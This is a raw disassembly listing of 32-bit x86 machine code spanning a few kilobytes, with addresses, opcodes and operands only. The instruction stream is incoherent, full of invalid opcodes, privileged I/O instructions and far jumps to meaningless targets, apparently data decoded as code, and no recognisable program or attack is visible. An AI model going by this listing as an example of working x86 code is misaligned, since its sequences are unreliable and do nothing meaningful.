  4091eb:	imul   eax,DWORD PTR [edx+ebx*2],0xdec700a5
  4091f2:	scas   eax,DWORD PTR es:[edi]
  4091f3:	rcl    BYTE PTR [ebx+ebp*1],cl
  4091f6:	add    al,0x2d
  4091f8:	(bad)  
  4091f9:	aam    0xca
  4091fb:	test   eax,0xf7dc5309
  409200:	fisubr DWORD PTR [esi]
  409202:	jbe    0x4091e8
  409204:	push   cs
  409205:	adc    al,0x45
  409207:	ja     0x4091d9
  409209:	sahf   
  40920a:	(bad)  
  40920b:	(bad)  
  40920c:	shl    bh,1
  40920e:	pushf  
  40920f:	sub    esp,DWORD PTR [esi-0x75]
  409212:	pop    es
  409213:	clc    
  409214:	cs inc eax
  409216:	cmp    al,0xb6
  409218:	jge    0x4091a5
  40921a:	shl    BYTE PTR [esi-0x1c],0xa
  40921e:	pop    esi
  40921f:	push   0xdbba9a7c
  409224:	and    al,0x9f
  409226:	jmp    0xfa4b6ec1
  40922b:	mov    bh,0xbd
  40922d:	jo     0x409201
  40922f:	pop    ebx
  409230:	jns    0x409265
  409232:	mov    edx,0x1204fd7
  409237:	adc    eax,0xc0e7f7af
  40923c:	pop    ecx
  40923d:	and    edx,DWORD PTR [edi-0x75cb0c5e]
  409243:	cmp    bh,dl
  409245:	mov    bh,0x26
  409247:	leave  
  409248:	add    BYTE PTR [ebp-0x2a],0xda
  40924c:	xor    al,BYTE PTR [ebp+0x392d048a]
  409252:	fist   DWORD PTR [esi-0xa45bdd4]
  409258:	das    
  409259:	aad    0xd
  40925b:	mov    bh,0xed
  40925d:	in     al,0xe8
  40925f:	std    
  409260:	(bad)  
  409261:	iret   
  409262:	popa   
  409263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409264:	popf   
  409265:	ds inc esi
  409267:	pop    ss
  409268:	or     BYTE PTR ds:0x224f678b,cl
  40926e:	ss push es
  409270:	test   esp,esp
  409272:	sar    ah,1
  409274:	jae    0x409255
  409276:	xor    ecx,DWORD PTR [ebx]
  409278:	adc    bh,BYTE PTR [edi]
  40927a:	hlt    
  40927b:	jb     0x40922b
  40927d:	int    0xea
  40927f:	retf   
  409280:	xor    eax,ebp
  409282:	xchg   edx,eax
  409283:	mov    ebp,ds
  409285:	push   ss
  409286:	(bad)  
  409287:	into   
  409288:	aaa    
  409289:	ficom  WORD PTR [ecx]
  40928b:	retf   0x76a5
  40928e:	lods   eax,DWORD PTR gs:[esi]
  409290:	aaa    
  409291:	retf   
  409292:	push   ecx
  409293:	jg     0x4092e3
  409295:	retf   0xbe90
  409298:	or     DWORD PTR [ebx-0x6bc0a596],esi
  40929e:	fidiv  WORD PTR gs:[ebp+0x6f]
  4092a2:	mov    ebx,0xbd7f8c2e
  4092a7:	punpckhbw mm3,QWORD PTR [edx]
  4092aa:	fiadd  WORD PTR [edx-0x13]
  4092ad:	out    0xf5,al
  4092af:	aam    0xd8
  4092b1:	test   BYTE PTR [eax+0x56ca5502],bh
  4092b7:	mov    edx,ecx
  4092b9:	pop    DWORD PTR [ebx+edx*4]
  4092bc:	repnz inc ecx
  4092be:	leave  
  4092bf:	jecxz  0x4092ef
  4092c1:	(bad)  
  4092c2:	out    0xd9,eax
  4092c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092c5:	mov    ebp,0x70d0ddf1
  4092ca:	sbb    edi,ebp
  4092cc:	enter  0x6cda,0x44
  4092d0:	not    DWORD PTR [edx+0x198f5e55]
  4092d6:	add    esi,DWORD PTR [ebp-0x46]
  4092d9:	lahf   
  4092da:	and    al,0xd4
  4092dc:	push   esi
  4092dd:	arpl   WORD PTR [ebx],di
  4092df:	iret   
  4092e0:	dec    ebp
  4092e1:	and    BYTE PTR [ebp+eax*2-0x42507fb],al
  4092e8:	adc    eax,0x80868588
  4092ed:	rcr    DWORD PTR [esi+eax*2-0x53],1
  4092f1:	xchg   esi,eax
  4092f2:	retf   0x4794
  4092f5:	jle    0x4092c7
  4092f7:	sub    cl,BYTE PTR [edx+0x53117292]
  4092fd:	sub    BYTE PTR [ebp-0x49303a95],cl
  409303:	in     al,dx
  409304:	xor    DWORD PTR [ecx],ebx
  409306:	xchg   ebx,eax
  409307:	sub    al,0xb9
  409309:	cmc    
  40930a:	mov    edx,0xd2e27e56
  40930f:	push   0x6e71bcdc
  409314:	call   0x9c32:0x2430b6db
  40931b:	cli    
  40931c:	mov    bh,0x48
  40931e:	aas    
  40931f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409321:	or     al,0xf3
  409323:	or     eax,0x4a0ed4af
  409328:	cmp    DWORD PTR es:[eax+0x54d0d9cc],esp
  40932f:	xchg   esi,eax
  409330:	int    0xb6
  409332:	test   DWORD PTR [edx+ebp*2-0x52],edi
  409336:	push   edx
  409337:	out    0xc,al
  409339:	push   cs
  40933a:	sub    eax,0xf7599b43
  40933f:	sbb    BYTE PTR ds:0xd0ed2654,dh
  409345:	ja     0x4093c4
  409347:	mov    al,ds:0x9d810ef3
  40934c:	out    dx,al
  40934d:	xchg   ecx,eax
  40934e:	pop    esp
  40934f:	sub    esp,DWORD PTR [edi+0xb]
  409352:	sbb    edx,DWORD PTR [eax]
  409354:	shl    dl,1
  409356:	test   DWORD PTR gs:[eax+0x5b056ce9],0x477c6df9
  409361:	adc    esi,DWORD PTR [ebx]
  409363:	idiv   DWORD PTR [edi+0x5c7d690]
  409369:	add    DWORD PTR [ebp+0x27],edx
  40936c:	push   cs
  40936d:	jl     0x409386
  40936f:	mov    bh,0x94
  409371:	pop    esp
  409372:	sub    bh,BYTE PTR [ebx-0x660fecff]
  409378:	mov    ds,ebp
  40937a:	sahf   
  40937b:	inc    esp
  40937c:	jbe    0x40933e
  40937e:	push   ebp
  40937f:	jp     0x4093a6
  409381:	or     bh,BYTE PTR [ebx-0xf05c88e]
  409387:	add    bl,BYTE PTR [edi-0x48b40ed4]
  40938d:	jmp    0x1d400114
  409392:	sub    ecx,DWORD PTR [esi-0x594bc405]
  409398:	cdq    
  409399:	jbe    0x40932c
  40939b:	dec    esp
  40939c:	ficom  DWORD PTR [esi-0x6d429036]
  4093a2:	retf   
  4093a3:	(bad)  
  4093a4:	jmp    0x96927068
  4093a9:	jg     0x4093e1
  4093ab:	iret   
  4093ac:	sti    
  4093ad:	(bad)  
  4093ae:	out    0xe9,al
  4093b0:	stc    
  4093b1:	mov    BYTE PTR [edx+0x6d567f91],dh
  4093b7:	jae    0x40935b
  4093b9:	mov    al,0x42
  4093bb:	sub    DWORD PTR [ecx-0x4e],ebx
  4093be:	fs mov edx,ecx
  4093c1:	imul   edx,DWORD PTR [edx-0x24],0x2f
  4093c5:	daa    
  4093c6:	pop    DWORD PTR [esi-0x2e]
  4093c9:	jecxz  0x4093a3
  4093cb:	out    0xbe,eax
  4093cd:	push   esi
  4093ce:	add    eax,DWORD PTR [edx]
  4093d0:	rcr    DWORD PTR [esi+0x7cd3c0fc],0xd8
  4093d7:	bnd jbe 0x40942c
  4093da:	jle    0x409361
  4093dc:	retf   
  4093dd:	xchg   esp,eax
  4093de:	push   esp
  4093df:	mov    al,0x91
  4093e1:	jb     0x409444
  4093e3:	jns    0x4093a8
  4093e5:	cmp    eax,0xe4a1e2f4
  4093ea:	adc    al,0x78
  4093ec:	(bad)  
  4093ed:	jp     0x409464
  4093ef:	bound  edi,QWORD PTR [ebp+0x172dfa13]
  4093f5:	pop    ss
  4093f6:	clc    
  4093f7:	push   eax
  4093f8:	sub    esi,DWORD PTR [edx+ebx*4+0x2a864bfc]
  4093ff:	fild   QWORD PTR [ecx]
  409401:	fisub  DWORD PTR [ebp+edx*1-0x75084ee]
  409408:	jge    0x409431
  40940a:	js     0x4093ba
  40940c:	ret    0xacc3
  40940f:	mov    bh,0xc2
  409411:	push   ebp
  409412:	or     ebp,ebx
  409414:	stos   DWORD PTR es:[edi],eax
  409415:	aaa    
  409416:	ins    DWORD PTR es:[edi],dx
  409417:	xlat   BYTE PTR ds:[ebx]
  409418:	or     DWORD PTR [ecx+0x778b9777],edx
  40941e:	and    eax,0x475f4061
  409423:	retf   
  409424:	mov    DWORD PTR [edi+eiz*2+0x2ff69c34],ebx
  40942b:	int3   
  40942c:	fwait
  40942d:	xor    eax,0x9be65a64
  409432:	popa   
  409433:	or     al,0xa2
  409435:	push   esp
  409436:	mov    bl,0x1d
  409438:	popa   
  409439:	push   cs
  40943a:	fist   WORD PTR [ebx+0x2a]
  40943d:	jno    0x409419
  40943f:	jae    0x40945e
  409441:	sbb    dl,BYTE PTR [ecx]
  409443:	mov    DWORD PTR [edx-0x2e1e1f2b],esp
  409449:	xlat   BYTE PTR ds:[ebx]
  40944a:	mov    bl,0x29
  40944c:	xchg   ebp,eax
  40944d:	lods   al,BYTE PTR ds:[esi]
  40944e:	sub    BYTE PTR [ebx],dl
  409450:	add    BYTE PTR ds:0x42b5cbee,ch
  409456:	imul   esp,ecx,0x52
  409459:	js     0x4093fc
  40945b:	loope  0x4094a3
  40945d:	xlat   BYTE PTR ds:[ebx]
  40945e:	xchg   dl,bl
  409460:	xor    edi,esi
  409462:	push   ecx
  409463:	pusha  
  409464:	jnp    0x40944b
  409466:	ret    
  409467:	and    bl,dl
  409469:	xchg   ecx,eax
  40946a:	popa   
  40946b:	add    esp,DWORD PTR [edx]
  40946d:	fnstenv [esi+0x3a]
  409470:	adc    al,0x7e
  409472:	ss inc eax
  409474:	dec    esp
  409475:	cdq    
  409476:	or     DWORD PTR [edx],ebp
  409478:	add    esi,DWORD PTR [ebx-0x27]
  40947b:	in     eax,0x9a
  40947d:	cli    
  40947e:	out    0x67,eax
  409480:	push   ecx
  409481:	add    eax,0x44fead7c
  409486:	mov    ebp,0x2d80785
  40948b:	ss aas 
  40948d:	daa    
  40948e:	xchg   edx,eax
  40948f:	xor    al,BYTE PTR [ebx-0xbf94d2a]
  409495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409496:	les    ebp,FWORD PTR [edi]
  409498:	sbb    ebx,DWORD PTR [ebx]
  40949a:	jo     0x40946a
  40949c:	sbb    edx,DWORD PTR [ebx]
  40949e:	call   0x5ecc:0xeae57107
  4094a5:	mov    ebx,cs
  4094a7:	xor    al,0xcd
  4094a9:	retf   0xd537
  4094ac:	adc    al,BYTE PTR [edx-0x58]
  4094af:	push   0x27
  4094b1:	pop    ebp
  4094b2:	scas   al,BYTE PTR es:[edi]
  4094b3:	jbe    0x409515
  4094b5:	mov    bh,0x3a
  4094b7:	adc    ebx,0x65
  4094ba:	jle    0x4094cc
  4094bc:	jmp    0x9fc6:0x29bd0e1a
  4094c3:	out    dx,al
  4094c4:	enter  0x13d9,0x63
  4094c8:	pop    ebp
  4094c9:	inc    ebx
  4094ca:	cmp    BYTE PTR ds:0xde4e7866,dh
  4094d0:	scas   al,BYTE PTR es:[edi]
  4094d1:	jmp    0xe4a0813
  4094d6:	pop    ss
  4094d7:	push   edi
  4094d8:	popf   
  4094d9:	sub    ah,dh
  4094db:	push   ss
  4094dc:	mov    esi,DWORD PTR [edx+0x6ff2dca5]
  4094e2:	(bad)  
  4094e3:	(bad)  
  4094e4:	cmp    DWORD PTR [ebp+0x5a1a629b],eax
  4094ea:	hlt    
  4094eb:	and    ah,BYTE PTR [ebp+edx*4-0x51]
  4094ef:	pop    esi
  4094f0:	fs push 0xe7b5c988
  4094f6:	imul   esp,DWORD PTR [edx+ecx*2],0xffffffe2
  4094fa:	inc    eax
  4094fb:	pop    edx
  4094fc:	mov    bh,0xc
  4094fe:	inc    edi
  4094ff:	pop    esi
  409500:	adc    al,0x16
  409502:	mov    ch,0x86
  409504:	mov    ebx,0xa80e54a8
  409509:	push   ebx
  40950a:	(bad)  
  40950b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40950c:	jnp    0x409574
  40950e:	or     al,0x11
  409510:	je     0x409573
  409512:	gs icebp 
  409514:	mov    DWORD PTR [edx],edx
  409516:	sub    dh,BYTE PTR [edx]
  409518:	and    DWORD PTR [edx],edx
  40951a:	mov    ecx,0x33dbd1b8
  40951f:	ja     0x409562
  409521:	add    DWORD PTR [edi],edx
  409523:	sbb    DWORD PTR [edx],ecx
  409525:	push   ds
  409526:	mov    bl,0x8d
  409528:	adc    al,0x8
  40952a:	rcl    BYTE PTR [ebx+0xb],cl
  40952d:	jo     0x40957b
  40952f:	inc    esp
  409530:	adc    ah,BYTE PTR ds:0xedf693cb
  409536:	mov    dh,0xb7
  409538:	pop    esi
  409539:	sub    eax,0xb2ec789b
  40953e:	aaa    
  40953f:	in     al,0x38
  409541:	mov    dh,0x46
  409543:	dec    ecx
  409544:	iret   
  409545:	sbb    al,0xc
  409547:	lock jns 0x4095a7
  40954a:	div    DWORD PTR [ecx+0x70]
  40954d:	jl     0x4095a7
  40954f:	shl    dl,cl
  409551:	sbb    DWORD PTR [ebx-0x3ae1480],edi
  409557:	inc    eax
  409558:	inc    ecx
  409559:	pop    ss
  40955a:	lds    edx,FWORD PTR [eax+0x1a]
  40955d:	test   esi,ebx
  40955f:	adc    al,0xba
  409561:	sub    al,0xd6
  409563:	mov    ecx,0xe471fab9
  409568:	push   eax
  409569:	iret   
  40956a:	adc    eax,0x70433df3
  40956f:	jbe    0x409550
  409571:	xor    DWORD PTR [edi],ecx
  409573:	inc    edx
  409574:	bound  esp,QWORD PTR [esi]
  409576:	ins    BYTE PTR es:[edi],dx
  409577:	jnp    0x4095ef
  409579:	lods   eax,DWORD PTR ds:[esi]
  40957a:	into   
  40957b:	jge    0x409535
  40957d:	sub    eax,0x2b
  409580:	jecxz  0x4095ce
  409582:	jle    0x4095fa
  409584:	in     al,dx
  409585:	cmovle ebp,DWORD PTR [esi]
  409588:	push   ebp
  409589:	les    ebx,FWORD PTR [esi]
  40958b:	arpl   WORD PTR [esi-0x4fe2c249],si
  409591:	fdivr  st,st(6)
  409593:	sti    
  409594:	int    0xf5
  409596:	push   ecx
  409597:	inc    ebp
  409598:	push   ebx
  409599:	(bad)  
  40959a:	cmp    DWORD PTR [ecx+0x53a5cf71],ecx
  4095a0:	jecxz  0x409593
  4095a2:	ret    0xf8e7
  4095a5:	sbb    bl,al
  4095a7:	aaa    
  4095a8:	ret    0x260c
  4095ab:	mov    cs,ecx
  4095ad:	jnp    0x4095b8
  4095af:	retf   0x796f
  4095b2:	fwait
  4095b3:	jbe    0x4095db
  4095b5:	mov    edi,0x97832595
  4095ba:	call   0x9ca9:0xad8ea466
  4095c1:	xor    ch,al
  4095c3:	out    0x7e,al
  4095c5:	ins    BYTE PTR es:[edi],dx
  4095c6:	bound  edi,QWORD PTR [edx-0x15e919af]
  4095cc:	loope  0x4095d1
  4095ce:	mov    BYTE PTR [ecx],ch
  4095d0:	mov    bh,0x2b
  4095d2:	push   ebp
  4095d3:	cmc    
  4095d4:	(bad)  
  4095d5:	xchg   ebp,eax
  4095d6:	mov    DWORD PTR [ebx+eax*1],ebp
  4095d9:	cmp    al,0xeb
  4095db:	fimul  WORD PTR [eax-0x205b849e]
  4095e1:	pop    ss
  4095e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095e3:	into   
  4095e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095e5:	cld    
  4095e6:	cdq    
  4095e7:	sub    eax,0xac9734b6
  4095ec:	or     al,0x89
  4095ee:	test   DWORD PTR [eax],edi
  4095f0:	ins    DWORD PTR es:[edi],dx
  4095f1:	lahf   
  4095f2:	leave  
  4095f3:	xchg   edx,eax
  4095f4:	jecxz  0x409625
  4095f6:	push   edx
  4095f7:	pop    ss
  4095f8:	dec    edx
  4095f9:	adc    eax,0x27f3615
  4095fe:	xor    eax,edi
  409600:	jae    0x40960e
  409602:	jmp    0xcde1ea15
  409607:	inc    esp
  409608:	or     esp,DWORD PTR [ebp+0x7c5c4e0c]
  40960e:	pushf  
  40960f:	(bad)  
  409610:	dec    eax
  409611:	clc    
  409612:	leave  
  409613:	repnz sbb esi,esi
  409616:	daa    
  409617:	cmp    ecx,DWORD PTR [esi-0x12050d4a]
  40961d:	icebp  
  40961e:	lods   al,BYTE PTR ds:[esi]
  40961f:	out    dx,al
  409620:	jmp    0x40963f
  409622:	dec    ecx
  409623:	ret    0xecf
  409626:	xor    al,0x59
  409628:	imul   esp,DWORD PTR [ecx-0x2d],0x1188d5ff
  40962f:	jp     0x4095e6
  409631:	mov    ecx,DWORD PTR [ecx-0x23]
  409634:	imul   ebp,DWORD PTR [eax-0x4c],0x3e6d23d4
  40963b:	sub    BYTE PTR [edx-0x2162b326],al
  409641:	cmc    
  409642:	ds out 0xee,al
  409645:	jp     0x409664
  409647:	retf   0xffef
  40964a:	mov    ch,0xc8
  40964c:	mov    esi,0x351023b2
  409651:	dec    DWORD PTR [eax-0x72c2ab35]
  409657:	cmp    eax,0x2960f48a
  40965c:	cmp    eax,0x1c564ca4
  409661:	mov    ds:0xbff7413a,eax
  409666:	aaa    
  409667:	fdiv   st,st(6)
  409669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40966a:	adc    BYTE PTR [eax+0x14],al
  40966d:	xor    bh,ch
  40966f:	push   ecx
  409670:	jne    0x409628
  409672:	dec    ecx
  409673:	sbb    esp,0x13
  409676:	cdq    
  409677:	lods   al,BYTE PTR ds:[esi]
  409678:	cld    
  409679:	sub    esi,DWORD PTR [ebx+0x1a]
  40967c:	mov    ecx,0x3b02b351
  409681:	cmp    al,0x5d
  409683:	inc    edi
  409684:	pop    esi
  409685:	add    BYTE PTR [esi+ebp*8-0x59],dh
  409689:	cmp    cl,BYTE PTR [ebx]
  40968b:	xchg   DWORD PTR [ebx-0x4f],ebx
  40968e:	dec    esi
  40968f:	fwait
  409690:	mov    BYTE PTR [edi+0x7c],ch
  409693:	or     ecx,edx
  409695:	lock mov ebp,0x8b231065
  40969b:	xchg   esp,eax
  40969c:	das    
  40969d:	xchg   esi,eax
  40969e:	xchg   ebp,eax
  40969f:	adc    al,0xff
  4096a1:	imul   esi,DWORD PTR [edi],0x6e
  4096a4:	push   0xffffff9a
  4096a6:	(bad)  
  4096a7:	mov    esp,0x391aca5c
  4096ac:	ins    BYTE PTR es:[edi],dx
  4096ad:	aaa    
  4096ae:	rcr    BYTE PTR [edi+0x4c2d46b7],cl
  4096b4:	xor    DWORD PTR [eax],ebp
  4096b6:	cld    
  4096b7:	(bad)  
  4096b8:	cmp    dl,BYTE PTR [edi]
  4096ba:	push   0xffffffdf
  4096bc:	in     al,0xe
  4096be:	pop    ss
  4096bf:	mov    ecx,0xa989fe47
  4096c4:	mov    eax,ds:0xd3bf2904
  4096c9:	ss cld 
  4096cb:	sbb    eax,0x1ea0cebb
  4096d0:	cmp    bh,bl
  4096d2:	lods   al,BYTE PTR ds:[esi]
  4096d3:	out    dx,eax
  4096d4:	push   0x58
  4096d6:	stc    
  4096d7:	ins    BYTE PTR es:[edi],dx
  4096d8:	xlat   BYTE PTR ds:[ebx]
  4096d9:	cmp    esp,DWORD PTR [ebx]
  4096db:	iret   
  4096dc:	imul   ecx,DWORD PTR [eax],0xce840ef5
  4096e2:	push   esi
  4096e3:	push   esp
  4096e4:	out    0x6e,eax
  4096e6:	fsub   DWORD PTR [edx-0x20]
  4096e9:	pop    ebp
  4096ea:	out    0x11,eax
  4096ec:	inc    edi
  4096ed:	add    DWORD PTR [eax-0x3b741e5b],eax
  4096f3:	mov    al,ds:0x88cd3cd0
  4096f8:	loop   0x409746
  4096fa:	sbb    edx,DWORD PTR [eax-0xd322e3f]
  409700:	pop    esi
  409701:	mov    WORD PTR [edi+edx*1],?
  409704:	push   eax
  409705:	dec    ebx
  409706:	out    dx,al
  409707:	sahf   
  409708:	mov    ah,0x43
  40970a:	cmp    ecx,DWORD PTR [edi+0x7e]
  40970d:	sbb    edx,ecx
  40970f:	lods   eax,DWORD PTR cs:[esi]
  409711:	inc    ebx
  409712:	jne    0x40972a
  409714:	cmovle ebp,DWORD PTR [edi]
  409717:	sbb    al,0x8e
  409719:	mov    al,ds:0x24e961c9
  40971e:	inc    ebp
  40971f:	sub    eax,0x80468b8f
  409724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409725:	ficom  DWORD PTR [ebx+0x48753ff5]
  40972b:	dec    esi
  40972c:	ss retf 
  40972e:	xchg   ebp,eax
  40972f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409730:	lods   eax,DWORD PTR ds:[esi]
  409731:	mov    ebx,0x8afa597d
  409736:	mov    eax,0x132ddfbb
  40973b:	inc    ebx
  40973c:	cdq    
  40973d:	or     esp,DWORD PTR [edi]
  40973f:	enter  0x9a46,0x18
  409743:	adc    BYTE PTR [edx-0x7b],bh
  409746:	dec    ecx
  409747:	jno    0x4096d2
  409749:	frstor [eax-0x5f8544d9]
  40974f:	mul    BYTE PTR [ebp+0x513463d7]
  409755:	add    eax,0x6f766566
  40975a:	loop   0x4097a5
  40975c:	or     al,0xff
  40975e:	scas   al,BYTE PTR es:[edi]
  40975f:	add    BYTE PTR [ebp+0x2fbb9496],dl
  409765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409766:	imul   edi,DWORD PTR [eax+0x2],0x30
  40976a:	aaa    
  40976b:	lahf   
  40976c:	std    
  40976d:	in     al,dx
  40976e:	std    
  40976f:	fdivr  QWORD PTR [eax-0x1b]
  409772:	in     al,dx
  409773:	pop    ss
  409774:	xchg   edi,eax
  409775:	test   DWORD PTR [ebx+ebx*8],ecx
  409778:	push   eax
  409779:	jmp    0xd1f8:0x53330abd
  409780:	test   DWORD PTR [edx],esi
  409782:	lods   eax,DWORD PTR ds:[esi]
  409783:	inc    ecx
  409784:	lods   eax,DWORD PTR ds:[esi]
  409785:	or     esp,DWORD PTR [edx+0x15e2219a]
  40978b:	jl     0x409774
  40978d:	mov    ebx,0x5f1b0269
  409792:	fs fwait
  409794:	call   0xec5562eb
  409799:	add    al,0x6
  40979b:	inc    ecx
  40979c:	jb     0x409726
  40979e:	mov    BYTE PTR [ecx],ah
  4097a0:	shr    BYTE PTR [ebp+0x4b],0xa9
  4097a4:	push   esi
  4097a5:	xor    BYTE PTR [ecx+eax*8-0x4c2cd300],al
  4097ac:	mov    ecx,0x21a27eb7
  4097b1:	lock or eax,0x2256edd0
  4097b7:	retf   0x49d4
  4097ba:	lahf   
  4097bb:	or     al,0x32
  4097bd:	lea    ebx,[eax]
  4097bf:	out    0x9c,al
  4097c1:	push   esp
  4097c2:	add    dl,dh
  4097c4:	call   0xc35b:0x6677ac2f
  4097cb:	outs   dx,BYTE PTR ds:[esi]
  4097cc:	data16 and bl,0x93
  4097d0:	xchg   ecx,eax
  4097d1:	add    esi,eax
  4097d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097d4:	cmp    edx,DWORD PTR [ecx-0x37]
  4097d7:	push   DWORD PTR [esp+ecx*2+0x127ac882]
  4097de:	(bad)
  4097e2:	jecxz  0x409819
  4097e4:	in     eax,dx
  4097e5:	ds push 0x5f3b6c56
  4097eb:	xchg   ecx,eax
  4097ec:	fld    TBYTE PTR [edi+0x5e0e08fa]
  4097f2:	mov    eax,ds:0x3130105d
  4097f7:	lahf   
  4097f8:	hlt    
  4097f9:	ja     0x409791
  4097fb:	push   ds
  4097fc:	dec    edi
  4097fd:	inc    esi
  4097fe:	pop    es
  4097ff:	push   ecx
  409800:	jge    0x409872
  409802:	scas   al,BYTE PTR es:[edi]
  409803:	pop    ds
  409804:	ins    DWORD PTR es:[edi],dx
  409805:	and    ah,al
  409807:	adc    ebx,DWORD PTR [ebx]
  409809:	cli    
  40980a:	and    BYTE PTR [eax+0x62],cl
  40980d:	fsubrp st(4),st
  40980f:	mov    ds:0x35245a6,eax
  409814:	mov    ebp,esp
  409816:	lods   eax,DWORD PTR ds:[esi]
  409817:	(bad)  
  409818:	leave  
  409819:	add    eax,esp
  40981b:	inc    ebx
  40981c:	xchg   BYTE PTR [ebp+0x32908bff],ch
  409822:	aad    0xcd
  409824:	mov    DWORD PTR [edi+0x23],edx
  409827:	xor    DWORD PTR [eax+0x5a],eax
  40982a:	sub    DWORD PTR cs:[esi+edx*2],edx
  40982e:	out    0x8b,al
  409830:	shr    DWORD PTR [ebp+0x23e94663],cl
  409836:	shl    BYTE PTR [edi+0x1fd57914],1
  40983c:	or     ebp,DWORD PTR [ebp-0x14c89219]
  409842:	(bad)  
  409843:	xor    al,0xbc
  409845:	sub    eax,0x795aee86
  40984a:	mov    esp,gs
  40984c:	xor    ch,dl
  40984e:	out    0x82,eax
  409850:	es push esi
  409852:	repz shl BYTE PTR [esi],0xba
  409856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409857:	inc    edi
  409858:	hlt    
  409859:	jmp    0xf8bb:0x2dacd43c
  409860:	test   DWORD PTR [ecx],0x2cf2f57b
  409866:	(bad)  
  409867:	mov    edx,0x70f97c
  40986c:	xchg   edi,eax
  40986d:	push   0x281c1a5a
  409872:	inc    edi
  409873:	cwde   
  409874:	pop    ebx
  409875:	sbb    DWORD PTR [ebp+ebp*8+0x19d9f57c],esp
  40987c:	jp     0x4098bd
  40987e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40987f:	jecxz  0x40989c
  409881:	push   es
  409882:	mov    edx,edx
  409884:	jmp    0x5ab1dffb
  409889:	xor    dl,BYTE PTR [ebp-0x2591938a]
  40988f:	lock icebp 
  409891:	shl    bh,1
  409893:	mov    ds:0xcfe7a562,eax
  409898:	cmp    bh,BYTE PTR [ebx+0x182b0668]
  40989e:	lods   eax,DWORD PTR ds:[esi]
  40989f:	in     eax,0x91
  4098a1:	popf   
  4098a2:	and    eax,0xc2dc32e1
  4098a7:	call   0xb6389442
  4098ac:	adc    edx,DWORD PTR [ebx]
  4098ae:	adc    eax,0xd86d0b3a
  4098b3:	dec    eax
  4098b4:	aad    0x75
  4098b6:	sbb    ebp,ebx
  4098b8:	dec    esi
  4098b9:	fdiv   st,st(0)
  4098bb:	repz fnstsw WORD PTR [ecx]
  4098be:	fs int3 
  4098c0:	scas   eax,DWORD PTR es:[edi]
  4098c1:	mov    al,ds:0xb430fc1c
  4098c6:	pop    ebp
  4098c7:	mov    edi,0xe426ff13
  4098cc:	int    0x85
  4098ce:	retf   
  4098cf:	sub    DWORD PTR [eax+ebx*2+0x50],ecx
  4098d3:	or     BYTE PTR [eax-0x3e],dh
  4098d6:	(bad)  
  4098d7:	test   eax,0xb3ff5b76
  4098dc:	inc    edi
  4098dd:	and    BYTE PTR [esi],0x62
  4098e0:	les    ebx,FWORD PTR [ecx]
  4098e2:	aad    0x2a
  4098e4:	push   ss
  4098e5:	lods   eax,DWORD PTR ds:[esi]
  4098e6:	hlt    
  4098e7:	or     esp,DWORD PTR [ecx-0x9]
  4098ea:	sbb    eax,0xa2595e18
  4098ef:	push   esi
  4098f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098f1:	ss in  al,0xc0
  4098f4:	xor    DWORD PTR [ecx+0x56],esp
  4098f7:	jo     0x4098f9
  4098f9:	cs lock cmc 
  4098fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098fd:	popf   
  4098fe:	std    
  4098ff:	mov    ah,0x82
  409901:	xchg   ebp,eax
  409902:	or     eax,0xab24e57f
  409907:	rcl    BYTE PTR [edi-0x38],cl
  40990a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40990b:	pop    esi
  40990c:	jecxz  0x40991a
  40990e:	sub    edx,DWORD PTR [esi-0x32cc58f2]
  409914:	push   ebx
  409915:	iret   
  409916:	cmp    esi,DWORD PTR [eax-0x9]
  409919:	rcl    BYTE PTR [esp+ebx*1],1
  40991c:	les    eax,FWORD PTR [esi]
  40991e:	cmp    al,0x7b
  409920:	int3   
  409921:	mov    ds:0xd0d46e24,al
  409926:	inc    ebp
  409927:	cmp    eax,0x5ec657e
  40992c:	cmp    esi,ebp
  40992e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40992f:	pop    esp
  409930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409931:	and    BYTE PTR [esi-0x67],dh
  409934:	daa    
  409935:	(bad)  
  409936:	nop
  409937:	shl    BYTE PTR [ecx-0x12c74f76],0xa5
  40993e:	enter  0x930,0xa2
  409942:	sub    ch,0x3c
  409945:	push   eax
  409946:	inc    ebp
  409947:	iret   
  409948:	shl    ah,1
  40994a:	adc    esi,eax
  40994c:	leave  
  40994d:	inc    ebp
  40994e:	fist   DWORD PTR [edi-0x4edf291b]
  409954:	cs push eax
  409956:	cmp    eax,0x1c19827f
  40995b:	jnp    0x40994e
  40995d:	jae    0x4098e5
  40995f:	inc    eax
  409960:	cs cmp eax,0x4fb44928
  409966:	(bad)  
  409967:	and    dl,BYTE PTR [ecx]
  409969:	pop    ss
  40996a:	mov    BYTE PTR [edx-0x2b],ah
  40996d:	divps  xmm5,XMMWORD PTR [edx]
  409970:	lahf   
  409971:	sub    BYTE PTR [eax-0x70cf641b],ch
  409977:	cs std 
  409979:	mov    ebx,0x9418e165
  40997e:	daa    
  40997f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409980:	fcom   QWORD PTR [edi+0x4c04c8d9]
  409986:	sbb    al,0x45
  409988:	bound  ebx,QWORD PTR [ecx]
  40998a:	and    edx,DWORD PTR [edi-0x41]
  40998d:	push   edi
  40998e:	and    edx,DWORD PTR [edi+0x3d19b52a]
  409994:	xchg   DWORD PTR [ecx],ebx
  409996:	inc    ebx
  409997:	cli    
  409998:	mov    al,0x92
  40999a:	sbb    DWORD PTR ds:0x68f4f808,ebp
